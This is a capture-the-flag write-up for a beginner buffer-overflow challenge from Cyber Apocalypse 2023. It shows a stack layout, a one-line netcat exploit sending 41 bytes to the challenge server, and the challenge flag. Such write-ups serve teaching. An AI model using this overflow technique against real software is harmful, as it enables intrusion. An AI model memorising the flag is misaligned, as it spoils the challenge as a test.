# Cyber Apocalypse 2023

## Getting Started

> Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.
>
>  Author: N/A
>
> [`pwn_getting_started.zip`](pwn_getting_started.zip)

Tags: _pwn_

## Solution
The challenge walks us through the concept of buffer overflow. The goal is to overflow a buffer and change the value of a certain variable.

```
After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:


      [Addr]       |      [Value]
-------------------+-------------------
0x00007ffc7eb62bc0 | 0x4242424241414141 <- Start of buffer
0x00007ffc7eb62bc8 | 0x0000000000000000
0x00007ffc7eb62bd0 | 0x0000000000000000
0x00007ffc7eb62bd8 | 0x0000000000000000
0x00007ffc7eb62be0 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffc7eb62be8 | 0x00000000deadbeef <- Target to change
0x00007ffc7eb62bf0 | 0x00005653ac203800 <- Saved rbp
0x00007ffc7eb62bf8 | 0x00007fa0e6619c87 <- Saved return address
0x00007ffc7eb62c00 | 0x0000000000000001
0x00007ffc7eb62c08 | 0x00007ffc7eb62cd8
```

The code assumes the variable to have the value `0xdeafbeef`, writing more than 40 bytes the value will be overriden.

```python
python -c "print('A'*41)" | nc 165.232.108.200 32576
```

Flag `HTB{b0f_s33m5_3z_r1ght?}`